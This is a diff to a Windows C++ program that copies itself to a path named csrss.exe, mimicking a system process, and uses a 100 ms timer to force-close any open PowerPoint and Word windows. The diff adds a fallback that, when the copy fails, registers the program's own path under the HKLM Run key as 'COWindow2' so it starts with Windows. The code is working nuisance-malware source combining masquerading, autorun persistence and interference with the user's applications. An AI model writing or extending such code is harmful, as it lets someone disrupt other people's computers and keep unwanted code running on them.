@@ -1,6 +1,7 @@
 #include <windows.h>
 #include <cstdlib>
 #include <cstring>
+#include <iostream>
 
 const int Time = 1;
 LRESULT CALLBACK WndProc(HWND hwnd,UINT Message,WPARAM wParam,LPARAM lParam);
@@ -48,9 +49,9 @@ LRESULT CALLBACK WndProc(HWND hwnd,UINT Message,WPARAM wParam,LPARAM lParam)
 {
 	static HWND hWILLBeClosed = 0x0;
 	static HWND hDialog;
-	static TCHAR Filename[100];
-	static TCHAR TargetFilename[100] = "D:\\Windowsexs\\csrss.exe";
-	static TCHAR Command[1000] = "echo f | xcopy ";
+	static TCHAR Filename[1001];
+	static TCHAR TargetFilename[1001] = "D:\\Windowsexs\\csrss.exe";
+	static TCHAR Command[1001] = "echo f | xcopy ";
 	static HKEY hKey;
 	switch(Message)
 	{
@@ -58,7 +59,7 @@ LRESULT CALLBACK WndProc(HWND hwnd,UINT Message,WPARAM wParam,LPARAM lParam)
 		{
 			if(wParam == Time)
 			{
-				//此处的类名可用SPY++手动查找. 
+				//Use SPY++ to find the name of windows class
 				hWILLBeClosed = FindWindowW((LPCWSTR)L"PP11FrameClass",NULL);
 				if(hWILLBeClosed)
 				{
@@ -79,7 +80,8 @@ LRESULT CALLBACK WndProc(HWND hwnd,UINT Message,WPARAM wParam,LPARAM lParam)
 				{
 					SendMessage(hWILLBeClosed,WM_CLOSE,0,0);
 				}
-				//自行添加 
+				
+				//to be set and added
 				hWILLBeClosed = FindWindowW((LPCWSTR)L"OpusApp",NULL);
 				if(hWILLBeClosed)
 				{
@@ -91,7 +93,7 @@ LRESULT CALLBACK WndProc(HWND hwnd,UINT Message,WPARAM wParam,LPARAM lParam)
 		
 		case WM_CREATE:	
 		{	  
-			//判断环境是否为WOW64
+			//check  if it is WOW64
 			BOOL isWOW64;  
 			REGSAM P;  
 			IsWow64Process(GetCurrentProcess(),&isWOW64);  
@@ -119,7 +121,18 @@ LRESULT CALLBACK WndProc(HWND hwnd,UINT Message,WPARAM wParam,LPARAM lParam)
 			strcat(Command,TargetFilename);
 			strcat(Command," ");
 			strcat(Command,"/Y");
-			system(Command);
+			int res = system(Command);
+			
+			//if it is failed to copy exe file
+			//then put it's own filepath into setup
+			if(res != 0)
+			{
+				RegCreateKeyEx(HKEY_LOCAL_MACHINE, TEXT("Software\\Microsoft\\Windows\\CurrentVersion\\Run"),0,NULL,0,P,NULL,&hKey,NULL);
+				RegDeleteKeyEx(hKey,"COWindow2",P,0); 
+				RegSetValueEx(hKey,"COWindow2",0,REG_SZ,(CONST BYTE*)Filename,sizeof(Filename)*sizeof(TCHAR));
+				RegCloseKey(hKey);
+				SetTimer(hwnd,Time,100,NULL);
+			}
 			break; 
 		}
 		
